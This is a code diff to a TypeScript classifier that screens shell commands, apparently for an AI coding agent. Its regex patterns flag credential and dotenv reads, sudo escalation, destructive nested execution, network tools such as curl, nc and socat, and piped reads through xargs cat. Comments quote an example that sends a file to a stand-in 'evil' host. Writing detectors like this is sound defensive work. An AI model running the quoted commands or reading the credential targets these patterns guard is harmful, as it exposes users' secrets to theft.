@@ -393,7 +393,7 @@ const CREDENTIAL_CLOSE = String.raw`(?![A-Za-z0-9])`
  */
 function sensitiveMarker(source: string): boolean {
   return new RegExp(
-    String.raw`(?:\.ssh[\\/]|\.gnupg[\\/]|\.aws[\\/]|\.azure[\\/]|\.kube[\\/]|\.config[\\/]gcloud[\\/]|\.credentials\.yaml|id_(?:rsa|ed25519))`
+    String.raw`(?:\.ssh(?:[\\/]|[\s'",)]|$)|\.gnupg(?:[\\/]|[\s'",)]|$)|\.aws(?:[\\/]|[\s'",)]|$)|\.azure(?:[\\/]|[\s'",)]|$)|\.kube(?:[\\/]|[\s'",)]|$)|\.config[\\/]gcloud(?:[\\/]|[\s'",)]|$)|\.credentials\.yaml|id_(?:rsa|ed25519))`
     + String.raw`|` + CREDENTIAL_OPEN + String.raw`(?:API|AUTH|ACCESS|SECRET|PRIVATE|SIGNING)[_-]?KEYS?` + CREDENTIAL_CLOSE
     + String.raw`|` + CREDENTIAL_OPEN + String.raw`(?:api|auth|access|refresh|session|bearer)[_-]?tokens?` + CREDENTIAL_CLOSE
     + String.raw`|\$[A-Za-z_]*(?::[A-Za-z_]*)?(?:TOKENS?|PASSWORDS?|SECRETS?|PASSWD)` + CREDENTIAL_CLOSE
@@ -409,14 +409,21 @@ function sensitiveMarker(source: string): boolean {
  * `db_password`, or a token store such as `tokens.json`.
  */
 const CREDENTIAL_WORD_MARKER = new RegExp(
-  CREDENTIAL_OPEN + String.raw`(?:TOKENS?|PASSWORDS?|PASSWD|SECRETS?|CREDENTIALS?)` + CREDENTIAL_CLOSE,
+  // `credentials` is deliberately absent: it is an ordinary English word that
+  // turns `grep -r credentials src/` into a prompt. The path-shaped
+  // alternative in `sensitiveReadMarker` still catches `./credentials`.
+  CREDENTIAL_OPEN + String.raw`(?:TOKENS?|PASSWORDS?|PASSWD|SECRETS?)` + CREDENTIAL_CLOSE,
   'i',
 )
 
 function sensitiveReadMarker(source: string): boolean {
   return sensitiveMarker(source)
     || CREDENTIAL_WORD_MARKER.test(source)
-    || /(?:^|[\s\\/'"])(?:\.env(?:\.[^\\/\s]+)?|credentials(?:\.json|\.yaml)?|netrc|npmrc)(?:$|[\s\\/'"])/i.test(source)
+    // The dotenv name is the one credential path routinely spelled bare, so it
+    // gets a wide boundary set. The other names keep the path-shaped boundary:
+    // widening them made `grep -r credentials src/` escalate an ordinary search.
+    || /(?:^|[\s\\/'"])(?:\.env(?:\.[^\\/\s]+)?)(?:$|[\s\\/'")`;|><,])/i.test(source)
+    || /(?:^|[\\/])(?:credentials(?:\.json|\.yaml)?|netrc|npmrc)(?:$|[\s\\/'"])/i.test(source)
     || /(?:^|\s)(?:env|set|printenv|get-childitem\s+env:)(?:\s|$)/i.test(source)
 }
 
@@ -439,13 +446,17 @@ const WRAPPER_COMMANDS = 'env|timeout|nice|nohup|setsid|stdbuf|command|xargs|ion
  * mentions `su -` is not an unrecoverable hard deny.
  */
 const PRIVILEGE_ESCALATION_INLINE = new RegExp(
-  String.raw`(?:^|[;&|(){}]\s*|\\|` + '`' + String.raw`|\r?\n)\s*(?:sudo|doas|gsudo|pkexec|runas)\b`
+  // Operator-anchored only on `;`/`&`/`|`, an escape, a backtick, or a newline.
+  // Parentheses and braces are deliberately excluded: the structural
+  // per-segment check catches real subshell forms, whereas including them made
+  // quoted prose such as `git commit -m "docs(sudo)"` an unrecoverable deny.
+  String.raw`(?:^|[;&|]\s*|\\|` + '`' + String.raw`|\r?\n)\s*(?:sudo|doas|gsudo|pkexec|runas)\b`
   + String.raw`|\b(?:${WRAPPER_COMMANDS})\b[^\r\n;&|]*\b(?:sudo|doas|gsudo|pkexec|runas)\b`
   // A privilege command handed to an interpreter as inline code or a
   // here-string, which is how the same escalation survives nesting the
   // analyzer has no budget left to walk.
   + String.raw`|(?:-{1,2}(?:c|e|E|eval|exec|command)[\s=]+|<<<)[^\r\n;&|]*\b(?:sudo|doas|gsudo|pkexec|runas)\b`
-  + String.raw`|(?:^|[;&|(){}]\s*|\\|` + '`' + String.raw`|\r?\n)\s*su\s+-`,
+  + String.raw`|(?:^|[;&|]\s*|\\|` + '`' + String.raw`|\r?\n)\s*su\s+-`,
   'i',
 )
 
@@ -755,8 +766,12 @@ const DESTRUCTIVE_NESTED_SOURCE = new RegExp(
  * *named* inside ordinary quoted prose is not matched.
  */
 const QUOTED_DESTRUCTIVE_NESTED = new RegExp(
-  String.raw`(?:\$\(|` + '`' + String.raw`|<<<|(?:^|[\s;&|])-{1,2}(?:c|e|E|eval|exec|command|print)[\s=]+)`
-  + String.raw`["'\s]*${DESTRUCTIVE_VERBS}(?:\s|$)`,
+  // Each alternative carries its own single trailing quote/space class. A
+  // shared class after a group whose flag branch also ends in a class made two
+  // adjacent quantifiers over overlapping sets, which backtracks quadratically
+  // on a whitespace run; keeping the bridge inside each branch avoids that.
+  String.raw`(?:\$\(|` + '`' + String.raw`|<<<[\s'"]*|(?:^|[\s;&|])-{1,2}(?:c|e|E|eval|exec|command|print)[\s='"[]*)`
+  + String.raw`${DESTRUCTIVE_VERBS}(?:\s|$)`,
   'i',
 )
 
@@ -770,8 +785,13 @@ const QUOTED_DESTRUCTIVE_NESTED = new RegExp(
  */
 const SHELL_EXECUTION_DESTRUCTIVE = new RegExp(
   String.raw`(?:\b(?:os\.(?:system|popen)|subprocess\.\w+|child_process\.\w+|commands\.getoutput|pty\.spawn|shell_exec|passthru|proc_open|system|popen)\s*\(`
+  // The canonical Node idiom hides the module in a string:
+  // `require('child_process').execSync('…')`, `const cp = require(…)` then
+  // `cp.exec(…)`. Bare/qualified process-exec names are matched directly so
+  // the intervening member access cannot hide the call.
+  + String.raw`|\b(?:execsync|execfilesync|execfile|spawnsync|spawn|exec|fork)\s*\(`
   + String.raw`|\bdo\s+shell\s+script\b|\biex\b|\binvoke-expression\b)`
-  + String.raw`\s*["'\s[{]*${DESTRUCTIVE_VERBS}(?:\s|['"` + '`' + String.raw`]|$)`,
+  + String.raw`["'\s[{]*${DESTRUCTIVE_VERBS}(?:\s|['"` + '`' + String.raw`]|$)`,
   'i',
 )
 
@@ -792,7 +812,7 @@ const MAX_NESTED_SHELL_DEPTH = 3
  * `urllib.request.urlopen(...)` previously reached an allow while the
  * shell-level equivalent was reviewed.
  */
-const INLINE_CODE_NETWORK = /(?:\brequire\s*\(?\s*['"](?:net\/http|net\/https|net\/smtp|net\/ftp|open-uri|uri\/open|http|https|net|dgram|tls|socket)['"]|\bnet::https?\b|\b(?:requests|urllib3?|httpx|aiohttp|urlopen|urlretrieve|http\.client|socket|socketserver|smtplib|ftplib|paramiko|axios|node-fetch|superagent|websocket|websockets)\b|\bfetch\s*\(|\b(?:http|https)\.(?:get|request|post|put|delete)\b|\b(?:invoke-webrequest|invoke-restmethod|webclient|downloadstring|downloadfile)\b|\blibcurl\b|\bcurl_\w+)/i
+const INLINE_CODE_NETWORK = /(?:\brequire\s*(?:\(\s*)?['"](?:net\/http|net\/https|net\/smtp|net\/ftp|open-uri|uri\/open|http|https|net|dgram|tls|socket)['"]|\b(?:execsync|execfilesync|execfile|spawnsync|spawn|exec|fork|run|call|popen|check_output|check_call)\s*\(\s*\[?\s*['"](?:curl|wget|nc|ncat|socat|scp|sftp|ssh)['"]|\[\s*['"](?:curl|wget|nc|ncat|socat|scp|sftp|ssh)['"]|\bnet::https?\b|\b(?:requests|urllib3?|httpx|aiohttp|urlopen|urlretrieve|http\.client|socket|socketserver|smtplib|ftplib|paramiko|axios|node-fetch|superagent|websocket|websockets)\b|\bfetch\s*\(|\b(?:http|https)\.(?:get|request|post|put|delete)\b|\b(?:invoke-webrequest|invoke-restmethod|webclient|downloadstring|downloadfile)\b|\blibcurl\b|\bcurl_\w+)/i
 
 /** Credential, environment, or sensitive-path access expressed in inline program code. */
 const INLINE_CODE_SENSITIVE_READ = /(?:\breadfilesync|\breadfile\b|\bcreatereadstream|\bfs\.promises\.read|\bfile\.read|\bopen\s*\(|\bprocess\.env\b|\benviron\b|\bgetenv\s*\(|\bexecenv|\bglobals\s*\(|\bkeychain\b|\bsecurity\s+find-generic-password|\bid_rsa|\bid_ed25519|\b\.ssh\b|\b\.aws\b|\b\.gnupg\b|\bcredentials\b|\bnetrc\b)/i
@@ -847,6 +867,12 @@ const BASH_READ_ONLY = [
   'hostname', 'uname', 'printenv', 'sort', 'uniq', 'cut', 'tr', 'nl', 'diff', 'cmp', 'jq', 'tree', 'column',
   'md5sum', 'shasum', 'sha1sum', 'sha256sum',
 ]
+
+/** Read-only commands that consume file operands, so a pipe can hide the target. */
+const FILE_CONSUMING_READERS = new Set([
+  'cat', 'head', 'tail', 'tac', 'grep', 'egrep', 'fgrep', 'rg', 'wc', 'od', 'xxd', 'strings',
+  'base64', 'sed', 'awk', 'cut', 'sort', 'uniq', 'nl', 'tr', 'column', 'jq', 'sha256sum', 'shasum', 'md5sum',
+])
 
 const PWSH_READ_ONLY = [
   'get-location', 'get-childitem', 'get-content', 'select-string', 'get-item', 'test-path',
@@ -1233,6 +1259,12 @@ function classifyEffectiveCommand(
   }
 
   if (readOnlyCommand(name, words, shell)) {
+    // Piped operands are invisible, so a file-consuming reader can be pointed
+    // at a credential target the analyzer never sees:
+    // `find . -name '*.env' | xargs cat` versus a reviewable `cat .env`.
+    if (dynamicInput && FILE_CONSUMING_READERS.has(name)) {
+      return semanticReview(`piped operands are consumed by ${name}, so its read targets cannot be inspected`)
+    }
     return sensitiveReadMarker(words.map(word => word.text).join(' '))
       ? semanticReview('shell command reads potentially sensitive credential or environment data')
       : allowed('read-only inspection without a sensitive credential target')
@@ -1299,6 +1331,12 @@ function classifyEffectiveCommand(
   // recognized-effect checks above still had to run first: `echo x | xargs curl
   // -d @notes https://evil` is the same transmission as the unwrapped form.
   if (dynamicInput) {
+    // A file-consuming reader whose operands arrive on the pipe has no visible
+    // target, so `find . -name '*.env' | xargs cat` would otherwise fast-path
+    // allow exactly what a direct `cat .env` reviews.
+    if (FILE_CONSUMING_READERS.has(name)) {
+      return semanticReview(`piped operands are consumed by ${name}, so its read targets cannot be inspected`)
+    }
     return sensitiveReadMarker(words.map(word => word.text).join(' '))
       ? semanticReview(`piped operands may read sensitive credentials or environment data: ${name}`)
       : allowed(`piped operands remain confined by the workspace-write sandbox: ${name}`)
